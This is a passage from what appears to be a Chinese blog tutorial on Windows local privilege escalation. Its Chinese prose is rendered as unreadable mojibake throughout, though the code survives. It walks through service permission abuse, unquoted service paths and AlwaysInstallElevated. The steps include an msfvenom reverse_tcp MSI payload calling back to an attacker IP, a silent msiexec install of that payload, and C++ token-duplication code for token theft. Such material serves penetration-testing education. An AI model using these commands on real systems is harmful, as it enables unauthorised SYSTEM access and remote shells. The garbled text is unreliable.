æˆ–ä¿®æ”¹çš„æ³¨å†Œè¡¨å€¼çš„åç§°ã€‚<br>/tï¼šæŒ‡å®šæ³¨å†Œè¡¨å€¼çš„ç±»å‹ã€‚åœ¨è¿™é‡Œæ˜¯REG_EXPAND_SZï¼Œè¡¨ç¤ºè¯¥å€¼åŒ…å«å¯æ‰©å±•çš„å­—ç¬¦ä¸²ã€‚<br>/dï¼šæŒ‡å®šè¦è®¾ç½®çš„æ•°æ®å€¼ã€‚<br>/fï¼šåœ¨æ‰§è¡Œå‘½ä»¤æ—¶å¼ºåˆ¶æ‰§è¡Œï¼Œå³ä¸è¿›è¡Œæç¤ºç¡®è®¤æ“ä½œã€‚<br></code></pre></td></tr></table></figure></li><li><p>æ‰§è¡Œä¸‹é¢å‘½ä»¤æ£€æŸ¥å½“å‰ç”¨æˆ·å¯¹è¯¥æœåŠ¡æ˜¯å¦æœ‰é‡å¯æƒé™ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula -ucqv &quot;Authenticated Users&quot; RegSvc<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448402.png" alt="image-20240327215915634"></p><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥é‡å¯æœåŠ¡è¿›è¡Œææƒ</p></li></ol><h2 id="æœåŠ¡è·¯å¾„æƒé™å¯æ§"><a href="#æœåŠ¡è·¯å¾„æƒé™å¯æ§" class="headerlink" title="æœåŠ¡è·¯å¾„æƒé™å¯æ§"></a>æœåŠ¡è·¯å¾„æƒé™å¯æ§</h2><p>å¦‚æœç›®æ ‡ä¸»æœºä¸Šç”¨æˆ·å­˜åœ¨é”™è¯¯é…ç½®æˆ–æ“ä½œï¼Œä½¿å¾—ä¸€ä¸ªä½æƒé™çš„ç”¨æˆ·å¯¹æ­¤æœåŠ¡è°ƒç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶æˆ–å…¶æ‰€åœ¨ç›®å½•æ‹¥æœ‰å†™å…¥æƒé™ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥å°†è¯¥æ–‡ä»¶æ›¿æ¢æˆæ”»å‡»è½½è·ï¼Œå¹¶éšç€æœåŠ¡çš„å¯åŠ¨ç»§æ‰¿ç³»ç»Ÿæƒé™ã€‚</p><ol><li><p>æ‰§è¡Œä¸‹é¢å‘½ä»¤æŸ¥çœ‹InsexeSvcè¿™ä¸ªæœåŠ¡çš„äºŒè¿›åˆ¶æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•æ˜¯å¦æœ‰å†™å…¥æƒé™</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula /quv &quot;C:\Program Files\Insecure Executables\&quot; <br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448403.png" alt="image-20240327221559789"></p></li><li><p>ç»“æœä¸­çœ‹åˆ°â€INTERACTIVEâ€ç»„å¯¹è¯¥æ–‡ä»¶å¤¹å…·æœ‰å®Œå…¨æ§åˆ¶æƒé™ã€</p><p>è¯¥ç»„åŒ…å«æ‰€æœ‰èƒ½å¤Ÿç™»å½•åˆ°ç³»ç»Ÿçš„æˆå‘˜ã€‚æ­¤æ—¶ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥å°†InsexeSvc æœåŠ¡çš„äºŒè¿›åˆ¶æ–‡ä»¶æ›¿æ¢æˆä¸€ä¸ªåŒåçš„æ”»å‡»è½½è·ï¼Œå¹¶éšç€æœåŠ¡çš„é‡å¯ç»§æ‰¿ç³»ç»Ÿæƒé™</p></li></ol><h2 id="æœªå¼•ç”¨çš„æœåŠ¡è·¯å¾„"><a href="#æœªå¼•ç”¨çš„æœåŠ¡è·¯å¾„" class="headerlink" title="æœªå¼•ç”¨çš„æœåŠ¡è·¯å¾„"></a>æœªå¼•ç”¨çš„æœåŠ¡è·¯å¾„</h2><p>æœªå¼•ç”¨çš„æœåŠ¡è·¯å¾„(Unquoted Service Path)æ¼æ´æ›¾è¢«ç§°ä¸ºå¯ä¿¡ä»»çš„æœåŠ¡è·¯å¾„(TrustedService Path)ï¼Œåˆ©ç”¨äº† Windows æ–‡ä»¶è·¯å¾„è§£æçš„ç‰¹æ€§ã€‚å½“æœåŠ¡å¯åŠ¨æ‰€æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶çš„è·¯å¾„ä¸­åŒ…å«ç©ºæ ¼ä¸”æœªæœ‰æ•ˆåŒ…å«åœ¨å¼•å·ä¸­æ—¶ï¼Œå°±ä¼šå¯¼è‡´è¯¥æ¼æ´ã€‚</p><p>é€ æˆè¯¥æ¼æ´çš„æ ¹æœ¬åŸå› åœ¨äº Windows ç³»ç»Ÿä¸­ç”¨äºåˆ›å»ºè¿›ç¨‹çš„ CreateProcess å‡½æ•°ã€‚</p><p>å¦‚æœå®Œæ•´è·¯å¾„ä¸­åŒ…å«ç©ºæ ¼ä¸”æœªæœ‰æ•ˆåŒ…å«åœ¨å¼•å·ä¸­ï¼Œé‚£ä¹ˆå¯¹äºè¯¥è·¯å¾„ä¸­çš„æ¯ä¸ªç©ºæ ¼Windows ä¼šæŒ‰ç…§ä»å·¦åˆ°å³çš„é¡ºåºä¾æ¬¡å°è¯•å¯»æ‰¾å¹¶æ‰§è¡Œä¸ç©ºæ ¼å‰çš„åå­—ç›¸åŒ¹é…çš„ç¨‹åºã€‚ä¾‹å¦‚,å¯¹äºè·¯å¾„ C:\Program Files\Sub Dir\Program Name.exe,ç³»ç»Ÿä¾æ¬¡å¯»æ‰¾å¹¶æ‰§è¡Œä»¥ä¸‹ç¨‹åºC:\Program.exeï¼ŒC:Program Files\Sub.exe ï¼ŒC:\Program Files\Sub Dir\Program.exeï¼ŒC:\Program Files\Sub Dir\Program Name.exe ã€‚</p><blockquote><p>å½“ç³»ç»Ÿè¿›è¡Œè¯¥è·¯å¾„å°è¯•çš„æ—¶å€™ï¼Œä¼šä»¥å½“å‰æœåŠ¡æ‰€æ‹¥æœ‰çš„æƒé™è¿›è¡Œã€‚æ‰€ä»¥å½“å¯¹å—å½±å“çš„ç›®å½•å…·æœ‰å†™å…¥æƒé™æ—¶ï¼Œå¯ä»¥ä¸Šä¼ ä¸€ä¸ªç‰¹æ®Šå‘½åçš„æ”»å‡»è½½è·åˆ°è¯¥ç›®å½•ä¸­</p></blockquote><ol><li><p>æ‰§è¡Œä¸‹é¢å‘½ä»¤æšä¸¾ä¸»æœºä¸Šæ‰€æœ‰æœ‰è¯¥æ¼æ´çš„æœåŠ¡</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic service get DisplayName, PathName, StartMode|findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448404.png" alt="image-20240327223437698"></p><p>å¯çŸ¥UnquoteSvcè¿™ä¸ªæœåŠ¡çš„è·¯å¾„æœ‰ç©ºæ ¼ä¸”æ²¡æœ‰å¼•å·åŒ…è£¹</p></li><li><p>ç”¨Accesschkæ£€æŸ¥è¯¥å—å½±å“çš„ç›®å½•</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula  -quv &quot;Authenticated Users&quot; &quot;C:\Program Files\Unquoted Path\&quot; <br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448405.png" alt="image-20240327224123522"></p><p>è¿™ä¸ªæ—¶å€™å°±å¯ä»¥å‘è¯¥ç›®å½•ä¸Šä¼ ä¸€ä¸ªSub.exeçš„æ”»å‡»è½½è·ï¼Œæ£€æŸ¥åˆ°è¿™é‡Œçš„æ—¶å€™å°±ä¼šä»¥SYSTEMæƒé™æ‰§è¡ŒSub.exeç¨‹åºã€‚</p></li></ol><h2 id="powerup"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h2><p>powerupå°±æ˜¯ä¸€ä¸ªpowershellè„šæœ¬ï¼Œé‡Œé¢é›†ä¸­äº†ä¸Šé¢æ‰€è¯´çš„æ‰€æœ‰æ–¹æ³•ã€‚ä½¿ç”¨æ–¹æ³•å¯ä»¥å»çœ‹å®˜æ–¹æ–‡æ¡£</p><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/PowerShellMafia/PowerSploit/">https://github.com/PowerShellMafia/PowerSploit/</a></p><p>è¿™é‡Œæœ‰ä¸€ç¯‡ä½¿ç”¨çš„æ–‡ç« ï¼š<a href="https://blog.51cto.com/binghe001/5247921">https://blog.51cto.com/binghe001/5247921</a></p><h1 id="msiå®‰è£…ç­–ç•¥ææƒ"><a href="#MSIå®‰è£…ç­–ç•¥ææƒ" class="headerlink" title="MSIå®‰è£…ç­–ç•¥ææƒ"></a>MSIå®‰è£…ç­–ç•¥ææƒ</h1><p>MSIå®‰è£…ç­–ç•¥ææƒæ˜¯ç”±äºç”¨æˆ·åœ¨é…ç½®MSIå®‰è£…ç­–ç•¥æ—¶ï¼Œå¯ç”¨äº†**â€œæ°¸è¿œä»¥é«˜ç‰¹æƒè¿›è¡Œå®‰è£…â€(AlwaysInstallElevatedï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸ºç¦ç”¨çŠ¶æ€)**ï¼Œä½¿å¾—ä»»ä½•æƒé™çš„ç”¨æˆ·éƒ½å¯ä»¥é€šè¿‡ SYSTEM æƒé™å®‰è£…MSIç¨‹åºã€‚æ­¤æ—¶æµ‹è¯•äººå‘˜å¯ä»¥åœ¨ç›®æ ‡ä¸»æœºä¸Šå®‰è£…ä¸€ä¸ªé¢„å…ˆåˆ¶ä½œçš„æ¶æ„MSIæ–‡ä»¶ï¼Œä»¥è·å¾—SYSTEM æƒé™ã€‚</p><blockquote><p>MSIï¼ˆMicrosoft Installerï¼‰æ˜¯ä¸€ç§ç”¨äº Windows æ“ä½œç³»ç»Ÿçš„å®‰è£…åŒ…æ ¼å¼ï¼ŒMSI å®‰è£…ç­–ç•¥æŒ‡çš„æ˜¯é’ˆå¯¹ MSI å®‰è£…ç¨‹åºçš„ä¸€ç³»åˆ—å®‰è£…å’Œé…ç½®è§„åˆ™ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„ MSI å®‰è£…ç­–ç•¥ï¼š</p><ol><li><strong>ç»„ç­–ç•¥ï¼ˆGroup Policyï¼‰</strong>ï¼šç®¡ç†å‘˜å¯ä»¥ä½¿ç”¨ç»„ç­–ç•¥æ¥æŒ‡å®šè®¡ç®—æœºæˆ–ç”¨æˆ·çº§åˆ«çš„ MSI å®‰è£…ç­–ç•¥ï¼Œä¾‹å¦‚å…è®¸æˆ–ç¦æ­¢ç‰¹å®šç¨‹åºçš„å®‰è£…ã€é…ç½®å®‰è£…åŒ…ä½ç½®ç­‰ã€‚</li><li><strong>é™é»˜å®‰è£…ï¼ˆSilent Installationï¼‰</strong>ï¼šé€šè¿‡åœ¨å‘½ä»¤è¡Œä¸­ä½¿ç”¨ç‰¹å®šå‚æ•°ï¼Œå¯ä»¥å®ç°æ— éœ€ç”¨æˆ·å¹²é¢„çš„ MSI é™é»˜å®‰è£…ã€‚è¿™ç§å®‰è£…æ–¹å¼é€šå¸¸ç”¨äºæ‰¹é‡éƒ¨ç½²è½¯ä»¶ã€‚</li><li><strong>å¸è½½ç­–ç•¥</strong>ï¼šç®¡ç†å‘˜å¯ä»¥æŒ‡å®šå¸è½½ MSI è½¯ä»¶çš„ç­–ç•¥ï¼ŒåŒ…æ‹¬æ˜¯å¦å…è®¸ç”¨æˆ·å¸è½½è½¯ä»¶ã€æ˜¯å¦å¼ºåˆ¶å¸è½½ç­‰ã€‚</li><li><strong>ä¿®è¡¥ç­–ç•¥ï¼ˆPatch Policyï¼‰</strong>ï¼šå…è®¸ç®¡ç†å‘˜ä¸ºå·²å®‰è£…çš„ MSI è½¯ä»¶åº”ç”¨ä¿®è¡¥ç¨‹åºï¼Œä»¥è§£å†³æ¼æ´æˆ–å¢åŠ åŠŸèƒ½ã€‚ç®¡ç†å‘˜å¯ä»¥è§„å®šå“ªäº›ä¿®è¡¥ç¨‹åºå…è®¸åº”ç”¨ã€å¦‚ä½•åº”ç”¨ä¿®è¡¥ç¨‹åºç­‰ã€‚</li><li><strong>å‡çº§ç­–ç•¥ï¼ˆUpgrade Policyï¼‰</strong>ï¼šç®¡ç†å‘˜å¯ä»¥å®šä¹‰å‡çº§ç­–ç•¥æ¥å‡çº§å·²å®‰è£…çš„è½¯ä»¶ç‰ˆæœ¬ï¼Œä»¥ç¡®ä¿ç½‘ç»œä¸Šçš„è®¡ç®—æœºéƒ½åœ¨è¿è¡Œæœ€æ–°ç‰ˆæœ¬ã€‚</li><li><strong>é™åˆ¶ç­–ç•¥ï¼ˆRestriction Policyï¼‰</strong>ï¼šå¯ä»¥é€šè¿‡ç­–ç•¥é™åˆ¶å“ªäº›ç”¨æˆ·æˆ–è®¡ç®—æœºå¯ä»¥å®‰è£…æŸä¸ª MSI è½¯ä»¶ï¼Œä»è€Œæ§åˆ¶è½¯ä»¶çš„åˆ†å‘å’Œè®¿é—®æƒé™ã€‚</li></ol><p>MSIå®é™…ä¸Šæ˜¯ä¸€ä¸ªæ•°æ®åº“ï¼ŒåŒ…å«å®‰è£…å’Œå¸è½½è½¯ä»¶æ—¶éœ€è¦ä½¿ç”¨çš„å¤§é‡æŒ‡ä»¤å’Œç¨‹åºæ•°æ®</p></blockquote><h2 id="ç¡®å®šç³»ç»Ÿæ˜¯å¦å­˜åœ¨æ¼æ´"><a href="#ç¡®å®šç³»ç»Ÿæ˜¯å¦å­˜åœ¨æ¼æ´" class="headerlink" title="ç¡®å®šç³»ç»Ÿæ˜¯å¦å­˜åœ¨æ¼æ´"></a>ç¡®å®šç³»ç»Ÿæ˜¯å¦å­˜åœ¨æ¼æ´</h2><p>å¦‚æœç”¨æˆ·é…ç½®äº†â€æ°¸è¿œä»¥é«˜ç‰¹æƒè¿›è¡Œå®‰è£…â€ï¼Œä¼šåœ¨æ³¨å†Œè¡¨ä¸‹é¢ä¸¤ä¸ªä½ç½®åˆ›å»ºé”®å€¼1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated<br>HKET_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated<br></code></pre></td></tr></table></figure><p>å¯ä»¥æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤è¿›è¡Œç¡®è®¤æ˜¯å¦å¼€å¯è¯¥ç‰¹æƒ</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448406.png" alt="image-20240327231001600"></p><h2 id="åˆ›å»ºæ¶æ„msiå¹¶å®‰è£…"><a href="#åˆ›å»ºæ¶æ„MSIå¹¶å®‰è£…" class="headerlink" title="åˆ›å»ºæ¶æ„MSIå¹¶å®‰è£…"></a>åˆ›å»ºæ¶æ„MSIå¹¶å®‰è£…</h2><p>ç¡®å®šç›®æ ‡ç³»ç»Ÿå­˜åœ¨è¯¥æ¼æ´åï¼Œä½¿ç”¨MetaSploitè‡ªåŠ¨ç”ŸæˆMSI</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.147 LPORT=4444 -f msi -o reverse_tcp.msi<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448407.png" alt="image-20240327231406326"></p><p>åœ¨ç°æœ‰çš„ Meterpreter ä¼šè¯ä¸­å°†åˆ›å»ºçš„MSIæ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡è®¡ç®—æœºï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤:</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msiexec /quiet /qn /i reverse_tcp.msi<br><span class="hljs-meta prompt_"># </span><span class="language-bash">/quietï¼Œåœ¨å®‰è£…æœŸé—´ç¦æ­¢å‘ç”¨æˆ·å‘é€ä»»ä½•æ¶ˆæ¯ï¼›/qnï¼Œæ— GUIæ¨¡å¼å…è®¸ï¼›/iï¼Œå¸¸è§„å®‰è£…</span><br></code></pre></td></tr></table></figure><p>æœ€ç»ˆææƒå¦‚ä¸‹ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151448408.png" alt="image-20240327231615328"></p><h1 id="è®¿é—®ä»¤ç‰Œæ“çºµ"><a href="#è®¿é—®ä»¤ç‰Œæ“çºµ" class="headerlink" title="è®¿é—®ä»¤ç‰Œæ“çºµ"></a>è®¿é—®ä»¤ç‰Œæ“çºµ</h1><p>Windows æ“ä½œç³»ç»Ÿçš„è®¿é—®æ§åˆ¶æ¨¡å‹(Access Control Model)æ˜¯ Windows ç³»ç»Ÿå®‰å…¨æ€§çš„åŸºç¡€æ„ä»¶ï¼Œç”±è®¿é—®ä»¤ç‰Œ(Access Token)å’Œå®‰å…¨æè¿°ç¬¦(Security Descriptor)ä¸¤éƒ¨åˆ†ç»„æˆï¼ŒäºŒè€…åˆ†åˆ«è¢«è®¿é—®è€…å’Œè¢«è®¿é—®è€…æ‰€æŒæœ‰ã€‚é€šè¿‡æ¯”è¾ƒè®¿é—®ä»¤ç‰Œå’Œå®‰å…¨æè¿°ç¬¦çš„å†…å®¹Windows å¯ä»¥å¯¹è®¿é—®è€…æ˜¯å¦æ‹¥æœ‰è®¿é—®èµ„æºå¯¹è±¡çš„èƒ½åŠ›è¿›è¡Œåˆ¤å®šã€‚</p><h2 id="è®¿é—®ä»¤ç‰Œ"><a href="#è®¿é—®ä»¤ç‰Œ" class="headerlink" title="è®¿é—®ä»¤ç‰Œ"></a>è®¿é—®ä»¤ç‰Œ</h2><p>å½“ç”¨æˆ·ç™»å½•æ—¶ï¼Œå¦‚æœéªŒè¯é€šè¿‡å°±ä¼šä¸ºç”¨æˆ·åˆ›å»ºä¸€ä¸ªè®¿é—®ä»¤ç‰Œï¼ŒåŒ…æ‹¬ç™»å½•è¿‡ç¨‹è¿”å›çš„SIDä»¥åŠç”±æœ¬åœ°å®‰å…¨ç­–ç•¥åˆ†é…ç»™ç”¨æˆ·å’Œç”¨æˆ·æ‰€å±å®‰å…¨ç»„çš„ç‰¹æƒåˆ—è¡¨ã€‚ä»£è¡¨è¯¥ç”¨æˆ·æ‰§è¡Œçš„æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰æ­¤è®¿é—®ä»¤ç‰Œçš„å‰¯æœ¬ã€‚</p><p>Windows ä¸­çš„ä»¤ç‰Œå¯ä»¥åˆ†ä¸ºä¸»ä»¤ç‰Œ(Primary Token)å’Œæ¨¡æ‹Ÿä»¤ç‰Œ(Impersonation Token)ã€‚ä¸»ä»¤ç‰Œä¸è¿›ç¨‹ç›¸å…³è”ï¼Œæ˜¯ç”± Windowså†…æ ¸åˆ›å»ºå¹¶åˆ†é…ç»™è¿›ç¨‹çš„é»˜è®¤è®¿é—®ä»¤ç‰Œã€‚ä¸»ä»¤ç‰Œä¸è¿›ç¨‹ç›¸å…³è”ï¼Œæ˜¯ç”±Windowså†…æ ¸åˆ›å»ºå¹¶åˆ†é…ç»™è¿›ç¨‹çš„é»˜è®¤è®¿é—®ä»¤ç‰Œã€‚<strong>æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªä¸»ä»¤ç‰Œ</strong>ï¼Œæè¿°äº†ä¸å½“å‰è¿›ç¨‹å…³è”çš„ç”¨æˆ·è´¦æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ã€‚</p><p>å½“è¿›ç¨‹ä¸å®‰å…¨å¯¹è±¡è¿›è¡Œäº¤äº’çš„æ—¶å€™ï¼Œç³»ç»Ÿå°†ä½¿ç”¨ä¸»ä»¤ç‰Œï¼›æ­¤å¤–ï¼Œçº¿ç¨‹å¯ä»¥æ¨¡æ‹Ÿå®¢æˆ·ç«¯è´¦æˆ·ï¼Œæ¨¡æ‹Ÿæ˜¯æŒ‡çº¿ç¨‹åœ¨å®‰å…¨ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œçš„èƒ½åŠ›ï¼Œå¹¶ä¸”è¯¥ä¸Šä¸‹æ–‡ä¸åŒäºæ‹¥æœ‰è¯¥çº¿ç¨‹çš„è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ã€‚<strong>å½“çº¿ç¨‹æ¨¡æ‹Ÿå®¢æˆ·ç«¯æ—¶ï¼Œæ¨¡æ‹Ÿçº¿ç¨‹å°†åŒæ—¶å…·æœ‰ä¸»è®¿é—®ä»¤ç‰Œå’Œæ¨¡æ‹Ÿä»¤ç‰Œã€‚</strong></p><blockquote><p>é€šè¿‡æ“çºµè®¿é—®ä»¤ç‰Œï¼Œä½¿å½“å‰çš„è¿›ç¨‹çœ‹èµ·æ¥åƒæ˜¯å…¶ä»–è¿›ç¨‹æ‰€å¯åŠ¨çš„å­è¿›ç¨‹æˆ–è€…å…¶ä»–ç”¨æˆ·æ‰€å¯åŠ¨çš„è¿›ç¨‹ï¼›ä½¿ç”¨å†…ç½®çš„Windows APIä»æŒ‡å®šçš„è¿›ç¨‹ä¸­å¤åˆ¶è®¿é—®ä»¤ç‰Œæ¥ç”¨äºç°æœ‰è¿›ç¨‹æˆ–è€…ç”Ÿæˆæ–°è¿›ç¨‹ï¼Œå¹¶ä»¥æ­¤æ¥ç»•è¿‡è®¿é—®æ§åˆ¶ï¼Œæå‡æƒé™ï¼Œ<strong>è¿™ä¸ªè¿‡ç¨‹å«åšä»¤ç‰Œçªƒå–ã€‚</strong></p></blockquote><p>å†…ç½®APIï¼š</p><table><thead><tr><th>Win32 API</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>OpenProcess</td><td>æ ¹æ®æä¾›çš„è¿›ç¨‹IDè·å–æŒ‡å®šè¿›ç¨‹çš„å¥æŸ„</td></tr><tr><td>OpenProcessToken</td><td>è·å–ä¸æŒ‡å®šè¿›ç¨‹ç›¸å…³è”çš„è®¿é—®ä»¤ç‰Œçš„å¥æŸ„</td></tr><tr><td>DuplicateTokenEx</td><td>å¤åˆ¶ç°æœ‰çš„è®¿é—®ä»¤ç‰Œä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„è®¿é—®ä»¤ç‰Œï¼ŒåŒ…æ‹¬åˆ›å»ºä¸»ä»¤ç‰Œæˆ–æ¨¡æ‹Ÿä»¤ç‰Œ</td></tr><tr><td>ImpersonateLoggedOnUser</td><td>è°ƒç”¨çº¿ç¨‹æ¥æ¨¡æ‹Ÿç™»å½•ç”¨æˆ·çš„è®¿é—®ä»¤ç‰Œçš„å®‰å…¨ä¸Šä¸‹æ–‡</td></tr><tr><td>CreateProcessWithTokenW</td><td>åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹åŠå…¶ä¸»çº¿ç¨‹ï¼Œæ–°è¿›ç¨‹åœ¨æŒ‡å®šä»¤ç‰Œçš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­è¿è¡Œ</td></tr><tr><td>CreateProcessAsUserA</td><td>åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹åŠå…¶ä¸»çº¿ç¨‹ï¼Œæ–°è¿›ç¨‹åœ¨ç”±æŒ‡å®šä»¤ç‰Œè¡¨ç¤ºçš„ç”¨æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­è¿è¡Œ</td></tr></tbody></table><p>è¿™æ˜¯ä¸€ä¸ªä½¿ç”¨apiå¤åˆ¶ä»¤ç‰Œçš„ç¨‹åºç¤ºä¾‹ï¼š</p><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    DWORD pid = <span class="hljs-number">1234</span>; <span class="hljs-comment">// æ›¿æ¢ä¸ºç›®æ ‡è¿›ç¨‹çš„è¿›ç¨‹ID</span><br>    HANDLE hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION, FALSE, pid);<br><br>    <span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;æ— æ³•æ‰“å¼€ç›®æ ‡è¿›ç¨‹ï¼Œé”™è¯¯ç ï¼š&quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; std::endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    HANDLE hToken;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">OpenProcessToken</span>(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &amp;hToken)) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;æ— æ³•è·å–ç›®æ ‡è¿›ç¨‹çš„è®¿é—®ä»¤ç‰Œï¼Œé”™è¯¯ç ï¼š&quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; std::endl;<br>        <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    HANDLE hTokenDuplicate;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">DuplicateTokenEx</span>(hToken, MAXIMUM_ALLOWED, <span class="hljs-literal">NULL</span>, SecurityImpersonation, TokenImpersonation, &amp;hTokenDuplicate)) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;æ— æ³•å¤åˆ¶è®¿é—®ä»¤ç‰Œï¼Œé”™è¯¯ç ï¼š&quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; std::endl;<br>        <span class="hljs-built_in">CloseHandle</span>(hToken);<br>        <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;æˆåŠŸå¤åˆ¶è®¿é—®ä»¤ç‰Œï¼&quot;</span> &lt;&lt; std::endl;<br><br>    <span class="hljs-comment">// è¿™é‡Œå¯ä»¥ä½¿ç”¨å¤åˆ¶çš„ä»¤ç‰Œè¿›è¡Œæ“ä½œ</span><br><br>    <span class="hljs-built_in">CloseHandle</span>(hToken);<br>    <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>    <span class="hljs-built_in">CloseHandle</span>(hTokenDuplicate);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼Œä»¤ç‰Œçªƒå–åªèƒ½åœ¨ç‰¹æƒç”¨æˆ·ä¸Šä¸‹æ–‡ä¸­æ‰èƒ½å®Œæˆï¼Œå› ä¸ºé€šè¿‡ä»¤ç‰Œåˆ›å»ºè¿›ç¨‹ä½¿ç”¨çš„CreateProcessWithTokenWå’Œ CreateProcessAsUserA ä¸¤ä¸ª WindowsAPIåˆ†åˆ«è¦æ±‚ç”¨æˆ·å¿…é¡»æ‹¥æœ‰SeImpersonatePrivilegeå’Œ SeAssignPrimaryTokenPrivilege&#x2F;SeIncreaseQuotaPrivilege ç‰¹æƒï¼Œè€Œæ‹¥æœ‰è¿™ä¸¤ä¸ªç‰¹æƒçš„ç”¨æˆ·ä¸€èˆ¬ä¸ºç³»ç»Ÿç®¡ç†å‘˜è´¦æˆ·ã€ç½‘ç»œæœåŠ¡è´¦æˆ·å’Œç³»ç»ŸæœåŠ¡è´¦æˆ·(å¦‚IISã€MSSQL ç­‰)ã€‚</p></blockquote><h2 id="å¸¸è§„ä»¤ç‰Œçªƒå–æ“ä½œ"><a href="#å¸¸è§„ä»¤ç‰Œçªƒå–æ“ä½œ" class="headerlink" title="å¸¸è§„ä»¤ç‰Œçªƒå–æ“ä½œ"></a>å¸¸è§„ä»¤ç‰Œçªƒå–æ“ä½œ</h2><p>å¸¸è§„çš„ä»¤ç‰Œçªƒå–æ“ä½œå¾€å¾€ç”¨æ¥å°†ä»ç®¡ç†å‘˜æƒé™æå‡è‡³SYSTEMã€TrustedInstaller ç­‰æ›´é«˜çš„ç³»ç»Ÿæƒé™ã€‚åœ¨å®æˆ˜ä¸­ï¼Œå¦‚æœæœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·å› ä¸ºæŸäº›ç»„ç­–ç•¥è®¾ç½®æ— æ³•è·å–æŸäº›ç‰¹æƒï¼Œå¯ä»¥é€šè¿‡ä»¤ç‰Œçªƒå–æ¥å‡å†’ NT AUTHORITY\SYSTEM çš„ä»¤ç‰Œï¼Œä»¥è·å–æ›´é«˜çš„ç³»ç»Ÿæƒé™ã€‚æ­¤å¤–ï¼Œä»¤ç‰Œçªƒå–è¿˜ç»å¸¸è¢«ç”¨äºé™æƒæˆ–ç”¨æˆ·åˆ‡æ¢ç­‰æ“ä½œã€‚</p><p><strong>åˆ©ç”¨incognito.exeçªƒå–ä»¤ç‰Œ</strong></p><p>å·¥å…·åœ°å€ï¼š<a 